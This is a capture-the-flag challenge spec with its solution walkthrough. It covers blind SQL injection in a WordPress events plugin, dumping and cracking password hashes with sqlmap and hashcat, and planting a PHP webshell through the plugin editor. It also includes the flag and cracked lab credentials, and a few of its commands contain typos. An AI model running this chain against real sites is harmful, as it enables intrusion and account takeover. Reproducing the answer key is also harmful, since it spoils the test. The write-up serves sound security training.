| metadata | <> |
|--- | --- |
| Developer Name(s) | sudosammy |
| Best Contact Slack handle / Email address | [redacted] |
| Challenge Category | Exploitation |
| Challenge Tier | 2-2 |
| Challenge Type | Container |

| Player facing | <> |
|--- | --- |
|Challenge Name | Not on my watch #2 |
|Challenge Description | Nice job on that last hack! After sulking for a while, R3kt Sec are back with a new blog. They’ve rotated all of their passwords, migrated to a new database, deleted a bunch of plugins, and updated the plugin that was vulnerable before to the patched version `2.2.80`! We were able to recover a low privileged user account though: `user1` password: `subscriber`… Maybe that will help? The new site is at: `http://exp-2-2` Note: this challenge requires password cracking - most small wordlists will be suitable, for example: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt | 
|Challenge Hint 1 | https://wordpress.org/plugins/events-made-easy/#developers According to the changelog they patched a bunch more SQL injections in the version AFTER the one R3kt Sec have upgraded to. |
|Challenge Hint 2 | Download the `2.2.80` and `2.2.81` versions from the wordpress.org website and use `git diff` to see what has changed. Also `sqmlap` will be your friend here. |

| Admin Facing | <> |
|--- | --- |
|Challenge Flag| WACTF{5174_maybe_we_wont_run_any_more_events} |
|Challenge Vuln| Blind SQLi in plugin, extract hashed password, crack it, use admin panel to get a shell and read file |
|Docker Usage Idle| 90MB RAM |
|Docker Usage Peak| 132MB RAM |
---

**NOTE: This challenge should not be visable to players who haven't completed the one before. It gives too much away**

1. Using your knowledge of the vulnerable plugin from exp-2, identify that more SQLi's were patched according to the changelog
2. Download and `git diff` the changes between the version running and patched version https://downloads.wordpress.org/plugin/events-made-easy.2.2.80.zip and https://downloads.wordpress.org/plugin/events-made-easy.2.2.81.zip
3. Identify dozens of possible SQLi paths, and find one which corresponds to the functionality available to you as the `user1` wordpress account:

```
@@ -4322,15 +4322,15 @@ function eme_ajax_bookings_list() {
                for ($i = 0; $i < count($opt); $i++) {
                        $fld = esc_sql($opt[$i]);
                        if ($fld == "booker") {
-                               $where_arr[] = "(lastname like '%".esc_sql($q[$i])."%' OR firstname '%".esc_sql($q[$i])."%')";
+                               $where_arr[] = "(lastname like '%".esc_sql($wpdb->esc_like($q[$i]))."%' OR firstname '%".esc_sql($wpdb->esc_like($q[$i]))."%')";
                        } else {
-                               $where_arr[] = $fld." like '%".esc_sql($q[$i])."%'";
+                               $where_arr[] = "'$fld' like '%".esc_sql($wpdb->esc_like($q[$i]))."%'";
                        }
                }
        }
        if (!empty($_REQUEST['search_customfields'])) {
                $answers_table = $wpdb->prefix.ANSWERS_TBNAME;
-               $search_customfields=$_REQUEST['search_customfields'];
+               $search_customfields=esc_sql($wpdb->esc_like($_REQUEST['search_customfields']));
                $sql="SELECT related_id FROM $answers_table WHERE answer LIKE '%$search_customfields%' AND type='booking' GROUP BY related_id";
                $booking_ids=$wpdb->get_col($sql);
                if (!empty($booking_ids))
```

4. It's easiest to use Burp to save the request and smash it into sqlmap: `sqlmap -r locations_list.burp -p jtSorting --dbms mysql`
5. Use sqlmap to extract the `wp_users` table just like last time. Player will probably use `--curent-db` first to get the database to use for this command: `sqlmap -r locations_list.burp -p jtSorting --dbms mysql --dump -D wordpress-exp-2-2 -T wp_users` (RIP if they use `wordpress` again...)
6. This time sqlmap won't be able to crack the passwords by default, use hashcat with basically any list: `hashcat -m 400 -a 0 -o crracked.txt wp_hashes.txt /usr/share/wordlists/sqlmap.txt`
7. Login as `mwaha_user_2` wiith cracked creds `$P$BTy3tgGxBN.bduyW/RpMHC8HZAzjRz0 (surf4life)` and get command execution one of the many ways available. The simplest way would be to overwrite a plugin file from `http://exp-2-2/wp-admin/plugin-editor.php` with a simple PHP webshell
